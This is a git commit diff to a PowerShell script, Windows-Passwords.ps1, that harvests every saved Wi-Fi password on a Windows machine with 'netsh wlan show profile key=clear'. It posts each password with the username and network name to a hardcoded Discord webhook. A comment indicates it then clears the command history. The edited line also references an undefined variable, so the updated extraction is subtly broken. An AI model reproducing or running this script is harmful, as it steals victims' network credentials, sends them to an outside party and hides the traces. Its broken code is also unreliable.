93ebbbe710cf1bb303e06fb5c4e440a7861db542
Boboher <92533902+Boboher@users.noreply.github.com>
2024-10-24 20:15:08 +0200

    Update Windows-Passwords.ps1

--- Windows-Passwords.ps1
+++ Windows-Passwords.ps1
@@ -1,15 +1,14 @@
-
 # ENG
 netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
     $wlan  = $_.Matches.Value
-    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
+    $passw = (netsh wlan show profile $wlanProfile key=clear | Select-String '(?<=Key Content\s+:\s).+').Matches.Value
 
 	$Body = @{
 		'username' = $env:username + " | " + [string]$wlan
-		'content' = [string]$passw
+		'content' = "Password: " + [string]$passw
 	}
 	
-	Invoke-RestMethod -ContentType 'Application/Json' -Uri 'https://discord.com/api/webhooks/1299047146456088637/g__uJpm_Yj7512QOVyxYE-Cz0Ev_Akzo5UrLyXaCiBLbXMbIpCKevYxgfI3aVWOt6nW2' -Method Post -Body ($Body | ConvertTo-Json)
+	Invoke-RestMethod -ContentType 'Application/Json' -Uri https://discord.com/api/webhooks/1299047146456088637/g__uJpm_Yj7512QOVyxYE-Cz0Ev_Akzo5UrLyXaCiBLbXMbIpCKevYxgfI3aVWOt6nW2 -Method Post -Body ($Body | ConvertTo-Json)
 }
 
 # Clear the PowerShell command history
